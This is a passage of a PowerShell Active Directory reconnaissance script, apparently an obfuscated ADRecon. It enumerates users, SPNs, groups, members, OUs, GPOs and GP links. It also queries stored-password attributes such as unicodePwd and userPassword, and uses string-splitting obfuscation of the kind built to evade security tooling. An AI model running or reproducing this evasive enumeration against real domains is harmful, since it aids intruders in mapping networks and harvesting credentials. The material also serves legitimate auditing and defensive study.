                    Write-Warning ("{6}{12}{17}{18}{20}{8}{4}{14}{15}{27}{10}{13}{3}{1}{21}{25}{0}{16}{2}{26}{29}{22}{23}{28}{9}{7}{11}{24}{19}{5}"-f 't','swo','e Defa','as','et','s','[Get-ADR','ing value ','r r','s','ax','as','U',' P','ri','eving','h','ser]',' Err','y','o','rd Age','sw','ord Policy.',' 90 da',' from ','ul',' M',' U','t Pas')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $PassMaxAge = 90
                }
                $UserObj =  ( chILDiTeM  ('vArIa'+'BLE:3'+'Y9')).VAlUe::("{2}{0}{1}"-f 'erParse','r','Us').Invoke($ADUsers, $date, $DormantTimeSpan, $PassMaxAge, $Threads)
            }
            If ($ADRUserSPNs)
            {
                $UserSPNObj =  $3Y9::("{0}{1}{3}{2}" -f 'UserSPN','Pa','r','rse').Invoke($ADUsers, $Threads)
            }
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Export-ADR -ADRObj $UserObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}" -f 'U','sers')
        Remove-Variable UserObj
    }
    If ($UserSPNObj)
    {
        Export-ADR -ADRObj $UserSPNObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{2}"-f'Use','rSP','Ns')
        Remove-Variable UserSPNObj
    }
}


Function Get-ADRPasswordAttributes
{

    param(
        [Parameter(MANDATORy = $true)]
        [string] $Method,

        [Parameter(maNdatOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MANdaTORY = $true)]
        [int] $PageSize
    )

    If ($Method -eq ("{0}{1}" -f 'ADW','S'))
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter ((("{20}{2}{16}{5}{6}{4}{7}{10}{12}{18}{9}{17}{3}{14}{0}{11}{13}{19}{15}{8}{1}" -f'(ms','))','s','(unicodePwd','Password','Use','r','=*','*','d=',')(UnixUs','SFU30P','erPa','ass','=*)','ord=','8(','*)','sswor','w','(g'))  -rePLacE  ([cHAr]103+[cHAr]115+[cHAr]56),[cHAr]124) -ResultPageSize $PageSize -Properties *
        }
        Catch
        {
            Write-Warning ("{18}{13}{9}{5}{14}{10}{1}{16}{0}{6}{17}{11}{7}{3}{8}{15}{20}{21}{2}{4}{12}{19}" -f 'o','tributes]','t','er','rib','as','r','um','at','t-ADRP','At','n','u','e','sword','ing Pas',' Err',' while e','[G','tes','swo','rd At')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADUsers)
        {
            Write-Warning "[*] Total PasswordAttribute Objects: $([ADRecon.ADWSClass]::ObjectCount($ADUsers)) "
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($Method -eq ("{0}{1}" -f'L','DAP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."p`AgE`SIZE" = $PageSize
        $ObjSearcher."Fi`Lt`eR" = (((("{10}{11}{0}{6}{4}{9}{2}{12}{5}{8}{3}{7}{1}"-f 'rd=*)(UnixU','sword=*))','icodePwd','U30','rPasswor','*)(ms','se','Pas','SF','d=*)(un','(Vip(UserPass','wo','='))-rEplAce([CHAR]86+[CHAR]105+[CHAR]112),[CHAR]124))
        $ObjSearcher."se`Ar`ChSco`pe" = ("{1}{0}{2}"-f'b','Su','tree')
        Try
        {
            $ADUsers = $ObjSearcher.("{0}{1}{2}" -f'Fi','ndA','ll').Invoke()
        }
        Catch
        {
            Write-Warning ("{5}{8}{2}{14}{12}{16}{13}{1}{15}{0}{11}{4}{3}{10}{7}{9}{6}"-f'r','ttributes','et','ile','r wh','[','utes','Attr','G','ib',' enumerating Password ','o','as','rdA','-ADRP','] Er','swo')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}"-f 'ose','disp').Invoke()

        If ($ADUsers)
        {
            $cnt =   (gET-cHilDiTEm  ('Va'+'RIabLE'+':3Y9')  ).vAlUe::("{2}{0}{1}" -f'b','jectCount','O').Invoke($ADUsers)
            If ($cnt -gt 0)
            {
                Write-Warning ('[*'+'] '+'To'+'tal '+'Passwor'+'dAt'+'t'+'ribute '+'Objec'+'ts'+': '+"$cnt")
            }
            $UserObj = $ADUsers
            Remove-Variable ADUsers
        }
    }

    If ($UserObj)
    {
        Return $UserObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGroup
{

    param(
        [Parameter(mANdaTorY = $true)]
        [string] $Method,

        [Parameter(MaNdaTOrY = $true)]
        [DateTime] $date,

        [Parameter(maNDatOrY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MandatoRy = $true)]
        [int] $PageSize,

        [Parameter(mAnDatoRy = $false)]
        [int] $Threads = 10,

        [Parameter(MandAtoRY = $true)]
        [string] $ADROutputDir,

        [Parameter(MandAtOrY = $true)]
        [array] $OutputType,

        [Parameter(mAndATORy = $false)]
        [bool] $ADRGroups = $true,

        [Parameter(mAndATorY = $false)]
        [bool] $ADRGroupChanges = $false
    )

    If ($Method -eq ("{1}{0}" -f 'S','ADW'))
    {
        Try
        {
            $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties AdminCount,CanonicalName,DistinguishedName,Description,GroupCategory,GroupScope,SamAccountName,SID,SIDHistory,managedBy,("{2}{4}{1}{3}{0}" -f 'aData','V','ms','alueMet','DS-Repl'),whenChanged,whenCreated )
        }
        Catch
        {
            Write-Warning ("{13}{12}{3}{7}{4}{10}{5}{9}{2}{1}{15}{0}{8}{11}{14}{6}"-f 'ati',' ','le','-ADRGro',' ','wh','Objects','up]','ng Gro','i','Error ','up','t','[Ge',' ','enumer')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.ADWSClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj =  ( GET-vaRIAble ObR  -vALuEoNLY)::("{1}{0}{2}"-f'pPars','Grou','er').Invoke($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj =  $obr::("{0}{4}{3}{1}{2}" -f 'Gro','eParse','r','g','upChan').Invoke($ADGroups, $date, $Threads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If ($Method -eq ("{1}{0}"-f'P','LDA'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."Pa`g`eSIZe" = $PageSize
        $ObjSearcher."fi`L`TeR" = ("{0}{5}{4}{3}{1}{2}"-f '(','=grou','p)','lass','C','object')
        $ObjSearcher."ProPe`Rt`IEstO`LoAd".("{0}{1}"-f'AddRan','ge').Invoke((("{1}{2}{0}" -f 'ncount','a','dmi'),("{1}{3}{2}{0}"-f'e','canonica','nam','l'), ("{2}{4}{3}{0}{1}" -f'a','me','dis','shedn','tingui'), ("{1}{2}{3}{0}" -f 'on','de','scrip','ti'), ("{0}{1}{2}"-f'grou','pt','ype'),("{3}{0}{1}{2}"-f'oun','t','name','samacc'), ("{0}{2}{1}"-f's','istory','idh'), ("{1}{2}{0}"-f'by','mana','ged'), ("{0}{2}{4}{1}{3}"-f'msds','va','-','luemetadata','repl'), ("{0}{1}{2}"-f 'ob','j','ectsid'), ("{3}{0}{1}{2}"-f 'ncr','e','ated','whe'), ("{1}{2}{0}"-f 'ed','whench','ang')))
        $ObjSearcher."sE`Ar`Chs`CoPE" = ("{0}{1}{2}"-f'Su','b','tree')

        Try
        {
            $ADGroups = $ObjSearcher.("{1}{2}{0}" -f'dAll','Fi','n').Invoke()
        }
        Catch
        {
            Write-Warning ("{11}{9}{4}{0}{8}{5}{3}{7}{10}{1}{6}{2}" -f 'p] ','ng G','p Objects','u','DRGrou','le en','rou','me','Error whi','A','rati','[Get-')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{2}{1}{0}" -f 'spose','i','d').Invoke()

        If ($ADGroups)
        {
            Write-Verbose "[*] Total Groups: $([ADRecon.LDAPClass]::ObjectCount($ADGroups)) "
            If ($ADRGroups)
            {
                $GroupObj =  $3y9::("{3}{0}{2}{1}"-f 'u','ser','pPar','Gro').Invoke($ADGroups, $Threads)
            }
            If ($ADRGroupChanges)
            {
                $GroupChangesObj =   (Gi  ("VarIAbl"+"e"+":"+"3Y9")).VaLue::("{3}{5}{1}{4}{0}{2}" -f'P','pC','arser','Gro','hange','u').Invoke($ADGroups, $date, $Threads)
            }
            Remove-Variable ADGroups
            Remove-Variable ADRGroups
            Remove-Variable ADRGroupChanges
        }
    }

    If ($GroupObj)
    {
        Export-ADR -ADRObj $GroupObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}" -f'ps','Grou')
        Remove-Variable GroupObj
    }

    If ($GroupChangesObj)
    {
        Export-ADR -ADRObj $GroupChangesObj -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}{2}{3}"-f 'roup','G','Change','s')
        Remove-Variable GroupChangesObj
    }
}

Function Get-ADRGroupMember
{

    param(
        [Parameter(MANdAtoRy = $true)]
        [string] $Method,

        [Parameter(MANDatOry = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mANDATorY = $true)]
        [int] $PageSize,

        [Parameter(MaNDAtoRY = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}" -f'WS','AD'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
            $ADDomainSID = $ADDomain."dom`A`insID"."Va`LUE"
            Remove-Variable ADDomain
        }
        Catch
        {
            Write-Warning ("{5}{2}{3}{1}{6}{10}{9}{11}{8}{12}{4}{0}{7}"-f 'Contex','Membe','DR','Group',' ','[Get-A','r','t','o','tti','] Error ge','ng D','main')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGroups = $ADGroups = @( Get-ADGroup -Filter * -ResultPageSize $PageSize -Properties SamAccountName,SID )
        }
        Catch
        {
            Write-Warning ("{1}{5}{9}{6}{14}{8}{13}{4}{12}{7}{0}{2}{11}{10}{3}" -f 'whil','[G','e enumerat','p Objects','b','e','-A','ror ','upM','t','rou','ing G','er] Er','em','DRGro')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }

        Try
        {
            $ADGroupMembers = @( Get-ADObject -LDAPFilter ((("{9}{2}{5}{0}{3}{1}{7}{10}{6}{4}{8}" -f'of=*','(pr','G',')','=*)','(member','pid','im',')','(mN','arygrou'))."r`EplA`cE"(([chaR]109+[chaR]78+[chaR]71),[sTrIng][chaR]124)) -Properties DistinguishedName,ObjectClass,memberof,primaryGroupID,sAMAccountName,samaccounttype )
        }
        Catch
        {
            Write-Warning ("{4}{15}{5}{14}{1}{10}{12}{13}{2}{6}{3}{7}{9}{11}{0}{16}{8}" -f'bje','ber] E','e','ng Gro','[Get-','roupMe',' enumerati','upM','ts','ember','rr',' O','o','r whil','m','ADRG','c')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.ADWSClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj =   (  childiteM  VariaBle:OBr ).ValUe::("{2}{1}{3}{4}{0}"-f 'r','rPa','GroupMembe','r','se').Invoke($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($Method -eq ("{0}{1}" -f'L','DAP'))
    {

        If ($Credential -ne   ( VaRIAblE q3cUvM  ).vAlUE::"emP`Ty")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DIS`TiNg`Ui`sHEDnAme")
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{0}{1}"-f 'D','omain'),$($DomainFQDN),$($Credential."us`ernA`mE"),$($Credential.("{4}{0}{2}{1}{3}{5}"-f'etNetw','Cr','ork','edentia','G','l').Invoke()."p`ASSW`ORd"))
            Try
            {
                $ADDomain =  (ITEM  VaRiAble:WM35 ).vALUe::("{1}{2}{0}" -f'n','GetDoma','i').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{11}{5}{8}{1}{7}{12}{4}{0}{10}{3}{9}{2}{6}"-f 'ai','M','nte',' C','or getting Dom','A','xt','ember] Er','DRGroup','o','n','[Get-','r')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}"-f'st','Fore'),$($ADDomain."fo`ReST"),$($Credential."USEr`Na`Me"),$($Credential.("{1}{3}{2}{0}"-f 'ial','GetNetwo','t','rkCreden').Invoke()."pAs`SwO`RD"))
                $ADForest =   (geT-ITEm ("v"+"aRiab"+"L"+"E"+":Kwx9E") ).VAlUE::("{1}{0}{2}" -f'etFor','G','est').Invoke($ForestContext)
            }
            Catch
            {
                Write-Warning ("{8}{6}{7}{0}{2}{1}{4}{3}{5}" -f'tt',' Fore','ing','t','st Con','ext','pMember] Err','or ge','[Get-ADRGrou')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.("{0}{3}{1}{4}{2}"-f'Fi','dGlobalC','talog','n','a').Invoke()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential."uS`ErNaME"),$($Credential.("{0}{1}{3}{2}"-f'GetNe','twor','ential','kCred').Invoke()."p`A`SsWORD"))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject."obJe`CT`SID"[0], 0)
                    $ADObject.("{2}{0}{1}"-f'isp','ose','D').Invoke()
                }
                Catch
                {
                    Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain."oB`jECt`SiD"[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain."O`Bj`EcTsId"[0], 0)
            }
        }
        Else
        {
            $ADDomain =  (lS ('VAR'+'IA'+'blE:Wm'+'35') ).VALue::("{4}{2}{1}{0}{3}" -f 'mai','rentDo','etCur','n','G').Invoke()
            $ADForest =   $Kwx9E::("{3}{1}{0}{2}{4}"-f'rentFo','tCur','re','Ge','st').Invoke()
            Try
            {
                $GlobalCatalog = $ADForest.("{0}{2}{1}{3}" -f 'FindGlo','l','balCata','og').Invoke()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject."Ob`jE`CTsid"[0], 0)
                $ADObject.("{0}{1}" -f'disp','ose').Invoke()
            }
            Catch
            {
                Write-Warning "[Get-ADRGroupMember] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain."oB`J`ECtsID"[0], 0)
            }
        }

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."pA`gE`SIzE" = $PageSize
        $ObjSearcher."f`ILter" = ("{0}{1}{3}{2}" -f '(object','Class=g','oup)','r')
        $ObjSearcher."pR`OperTie`ST`Ol`Oad".("{1}{2}{0}" -f'e','AddRa','ng').Invoke((("{1}{3}{2}{0}"-f'ame','sama','countn','c'), ("{0}{1}"-f 'o','bjectsid')))
        $ObjSearcher."searC`h`s`copE" = ("{1}{0}"-f 'btree','Su')

        Try
        {
            $ADGroups = $ObjSearcher.("{1}{0}{2}"-f 'n','Fi','dAll').Invoke()
        }
        Catch
        {
            Write-Warning ("{9}{4}{14}{3}{7}{8}{5}{0}{1}{11}{10}{2}{15}{16}{6}{17}{12}{13}"-f'while en','u','ti','GroupMemb','Get-A','ror ','ou','e','r] Er','[','era','m','t','s','DR','ng G','r','p Objec')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{2}{1}"-f'd','e','ispos').Invoke()

        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."pA`GeS`ize" = $PageSize
        $ObjSearcher."f`ILtER" = ((("{8}{5}{7}{3}{4}{1}{0}{2}{6}" -f'upid','ygro','=','(prim','ar','b','*))','erof=*)','(QAw(mem'))."re`pla`Ce"('QAw',[sTRiNG][char]124))
        $ObjSearcher."pRoPErT`IeS`Tol`o`AD".("{0}{2}{1}"-f'A','dRange','d').Invoke((("{3}{1}{2}{0}"-f'edname','ui','sh','disting'), ("{3}{0}{1}{2}" -f 'hostn','am','e','dns'), ("{0}{2}{1}" -f'obj','ss','ectcla'), ("{2}{0}{1}{3}"-f'r','imarygroupi','p','d'), ("{1}{0}{2}" -f'be','mem','rof'), ("{0}{2}{3}{1}" -f'sama','name','cco','unt'), ("{1}{0}{3}{2}{4}" -f'c','sama','untty','co','pe')))
        $ObjSearcher."sea`RC`h`SCope" = ("{0}{1}" -f 'Su','btree')

        Try
        {
            $ADGroupMembers = $ObjSearcher.("{1}{0}"-f'dAll','Fin').Invoke()
        }
        Catch
        {
            Write-Warning ("{5}{4}{10}{0}{1}{3}{7}{9}{11}{6}{8}{13}{12}{2}" -f 'Member] Error whil','e','Objects',' en','ADRGrou','[Get-','p','umerati','Memb','n','p','g Grou','r ','e')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}"-f 'ispose','d').Invoke()

        If ( ($ADDomainSID) -and ($ADGroups) -and ($ADGroupMembers) )
        {
            Write-Verbose "[*] Total GroupMember Objects: $([ADRecon.LDAPClass]::ObjectCount($ADGroupMembers)) "
            $GroupMemberObj =  (gEt-iteM  ('vaRiA'+'B'+'le:3y9')).VAlUE::("{2}{3}{1}{4}{0}" -f'ser','er','Gr','oupMemb','Par').Invoke($ADGroups, $ADGroupMembers, $ADDomainSID, $Threads)
            Remove-Variable ADGroups
            Remove-Variable ADGroupMembers
            Remove-Variable ADDomainSID
        }
    }

    If ($GroupMemberObj)
    {
        Return $GroupMemberObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADROU
{

    param(
        [Parameter(mAnDAtory = $true)]
        [string] $Method,

        [Parameter(mANdATORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mAnDatoRy = $true)]
        [int] $PageSize,

        [Parameter(maNdATOry = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            $ADOUs = @( Get-ADOrganizationalUnit -Filter * -Properties DistinguishedName,Description,Name,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning ("{6}{0}{1}{5}{8}{7}{4}{3}{2}" -f 't-ADR','OU] Error w','s','U Object','merating O','h','[Ge','u','ile en')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.ADWSClass]::ObjectCount($ADOUs)) "
            $OUObj =   (GeT-ITeM  ('VARIab'+'le:'+'Ob'+'r') ).vaLuE::("{0}{2}{1}" -f'OU','rser','Pa').Invoke($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($Method -eq ("{0}{1}" -f'LDA','P'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."P`AgEs`ize" = $PageSize
        $ObjSearcher."fI`LTeR" = ("{1}{2}{7}{4}{3}{0}{5}{9}{6}{8}"-f'rgani','(','objectcla','=o','s','zat','na','s','lunit)','io')
        $ObjSearcher."pROp`ERtI`e`S`T`oLoAd".("{1}{0}" -f'e','AddRang').Invoke((("{3}{1}{2}{0}" -f'ame','ng','uishedn','disti'),("{0}{1}{2}"-f 'desc','r','iption'),("{1}{0}"-f 'e','nam'),("{2}{0}{1}" -f'e','ated','whencr'),("{3}{0}{1}{2}"-f'enchang','e','d','wh')))
        $ObjSearcher."sEa`RC`HscOpE" = ("{1}{0}{2}"-f't','Sub','ree')

        Try
        {
            $ADOUs = $ObjSearcher.("{2}{1}{0}"-f 'ndAll','i','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{1}{7}{4}{3}{8}{2}{6}{5}{0}{11}{10}{9}" -f'OU Ob','[Get-A','era','rro','] E','ng ','ti','DROU','r while enum','s','t','jec')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{1}{0}" -f'ose','disp').Invoke()

        If ($ADOUs)
        {
            Write-Verbose "[*] Total OUs: $([ADRecon.LDAPClass]::ObjectCount($ADOUs)) "
            $OUObj =  (iTEM VaRiaBlE:3y9).vALUe::("{0}{1}" -f'OUParse','r').Invoke($ADOUs, $Threads)
            Remove-Variable ADOUs
        }
    }

    If ($OUObj)
    {
        Return $OUObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRGPO
{

    param(
        [Parameter(MANDAToRy = $true)]
        [string] $Method,

        [Parameter(MANdatORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MaNDAtoRY = $true)]
        [int] $PageSize,

        [Parameter(MandAtOry = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f'WS','AD'))
    {
        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter ("{0}{2}{4}{1}{6}{3}{5}{7}" -f'(objectCat','Poli','egory','Co','=group','ntainer','cy',')') -Properties DisplayName,DistinguishedName,Name,gPCFileSysPath,whenCreated,whenChanged )
        }
        Catch
        {
            Write-Warning ("{3}{7}{2}{4}{11}{0}{14}{1}{10}{9}{6}{5}{13}{12}{8}" -f 'e enu','rating groupPolic','w','[Get-ADRGPO] E','h','in','ta','rror ','cts','n','yCo','il',' Obje','er','me')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.ADWSClass]::ObjectCount($ADGPOs)) "
            $GPOsObj =  ( GcI vARiaBLe:oBr ).vaLuE::("{2}{1}{0}" -f'er','POPars','G').Invoke($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($Method -eq ("{1}{0}"-f 'AP','LD'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."p`A`GesIZe" = $PageSize
        $ObjSearcher."f`I`lter" = (("{3}{9}{5}{7}{8}{10}{2}{1}{4}{6}{0}"-f 'ntainer)','P','up','(o','o','ectCa','licyCo','te','go','bj','ry=gro'))
        $ObjSearcher."seaRc`HS`cOpE" = ("{1}{0}{2}"-f'tre','Sub','e')

        Try
        {
            $ADGPOs = $ObjSearcher.("{0}{1}"-f 'Find','All').Invoke()
        }
        Catch
        {
            Write-Warning ("{5}{13}{11}{0}{12}{8}{10}{7}{4}{15}{6}{9}{1}{14}{3}{2}" -f 'while e','iner Ob','s','ct','g ','[Get-ADRGPO','licyCon','n','at','ta','i','Error ','numer','] ','je','groupPo')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{2}{1}{0}"-f 'se','ispo','d').Invoke()

        If ($ADGPOs)
        {
            Write-Verbose "[*] Total GPOs: $([ADRecon.LDAPClass]::ObjectCount($ADGPOs)) "
            $GPOsObj =   $3y9::("{1}{2}{0}"-f'er','GPOPa','rs').Invoke($ADGPOs, $Threads)
            Remove-Variable ADGPOs
        }
    }

    If ($GPOsObj)
    {
        Return $GPOsObj
    }
    Else
    {
        Return $null
    }
}


Function Get-ADRGPLink
{

    param(
        [Parameter(MAnDatOrY = $true)]
        [string] $Method,

        [Parameter(mandatoRY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(MaNDAtOry = $true)]
        [int] $PageSize,

        [Parameter(MaNdaToRy = $false)]
        [int] $Threads = 10
    )

    If ($Method -eq ("{1}{0}"-f'S','ADW'))
    {
        Try
        {
            $ADSOMs = @( Get-ADObject -LDAPFilter ((("{15}{1}{13}{9}{11}{6}{2}{0}{14}{10}{8}{7}{3}{4}{12}{5}"-f 'mai','8','do','niza','tiona','nit))','s=','a','ss=org','object','ectcla','clas','lU','(','n)(obj','(KQ'))."rEplA`ce"(([cHAR]75+[cHAR]81+[cHAR]56),[StRinG][cHAR]124)) -Properties DistinguishedName,Name,gPLink,gPOptions )
            $ADSOMs += @( Get-ADObject -SearchBase "CN=Sites,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{4}{3}{1}{2}{0}" -f 's=site)','t','clas','objec','(')) -Properties DistinguishedName,Name,gPLink,gPOptions )
        }
        Catch
        {
            Write-Warning ("{1}{6}{4}{10}{8}{7}{5}{9}{0}{2}{3}" -f ' Obj','[Get-AD','e','cts','GPL','r','R','me','k] Error while enu','ating SOM','in')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADGPOs = @( Get-ADObject -LDAPFilter (("{6}{1}{5}{4}{2}{0}{3}"-f'oupPolicyContain','ect','r','er)','=g','Category','(obj')) -Properties DisplayName,DistinguishedName )
        }
        Catch
        {
            Write-Warning ("{11}{6}{0}{12}{10}{9}{2}{8}{3}{7}{4}{1}{5}" -f'GPLink] Error w','ject','rating g','iner','b','s','-ADR',' O','roupPolicyConta','le enume','i','[Get','h')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ( ($ADSOMs) -and ($ADGPOs) )
        {
            Write-Verbose "[*] Total SOMs: $([ADRecon.ADWSClass]::ObjectCount($ADSOMs)) "
            $SOMObj =  $ObR::("{2}{0}{1}"-f'OMP','arser','S').Invoke($ADGPOs, $ADSOMs, $Threads)
            Remove-Variable ADSOMs
            Remove-Variable ADGPOs
        }
    }

    If ($Method -eq ("{1}{0}"-f 'DAP','L'))
    {
        $ADSOMs = @()
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher."Page`Si`ZE" = $PageSize
        $ObjSearcher."F`ILT`ER" = ((("{4}{6}{10}{2}{1}{9}{0}{3}{5}{7}{8}" -f'c','bjectc','o','tclass=','(','organ','CL','iza','tionalUnit))','lass=domain)(obje','b('))  -CrEpLacE([CHAr]67+[CHAr]76+[CHAr]98),[CHAr]124)
        $ObjSearcher."PRoPertieS`To`LoaD".("{1}{2}{0}" -f'ge','Add','Ran').Invoke((("{1}{0}{3}{2}{4}{5}" -f 's','di','h','tinguis','e','dname'),("{1}{0}" -f 'ame','n'),("{0}{2}{1}" -f 'g','k','plin'),("{0}{1}{2}" -f'gpoptio','n','s')))
        $ObjSearcher."S`EArChsC`oPe" = ("{0}{1}" -f'S','ubtree')

        Try
        {
            $ADSOMs += $ObjSearcher.("{1}{0}"-f 'indAll','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{7}{8}{6}{1}{4}{10}{3}{5}{12}{9}{0}{11}{2}" -f 'OM Ob','ink','ts','ile','] Erro',' ','RGPL','[','Get-AD','rating S','r wh','jec','enume')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.("{0}{1}" -f 'd','ispose').Invoke()

        $SearchPath = ("{1}{0}"-f '=Sites','CN')
        If ($Credential -ne   (  vARIAbLe Q3cUVm ).VALUe::"eM`ptY")
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential."U`SE`Rname",$Credential.("{5}{0}{2}{3}{4}{6}{1}" -f'r','al','kC','re','dent','GetNetwo','i').Invoke()."paSS`WO`Rd"
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher."fiLt`ER" = (("{2}{3}{1}{0}"-f's=site)','tclas','(o','bjec'))
        $ObjSearcher."PrOP`eRT`IestoL`oad".("{0}{1}" -f'A','ddRange').Invoke((("{3}{1}{2}{0}"-f 'shedname','i','stingui','d'),("{1}{0}" -f'me','na'),("{1}{0}"-f'k','gplin'),("{2}{1}{0}" -f 'ions','opt','gp')))
        $ObjSearcher."s`e`ArcHSCO`pE" = ("{0}{1}"-f'Su','btree')

        Try
        {
            $ADSOMs += $ObjSearcher.("{2}{0}{1}" -f'indAl','l','F').Invoke()
        }
        Catch
        {
            Write-Warning ("{9}{11}{7}{2}{5}{13}{14}{12}{8}{6}{0}{4}{10}{1}{3}" -f 'u','bjec','D','ts','mera','R','n','t-A',' e','[G','ting SOM O','e','le','GPLink] Error wh','i')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
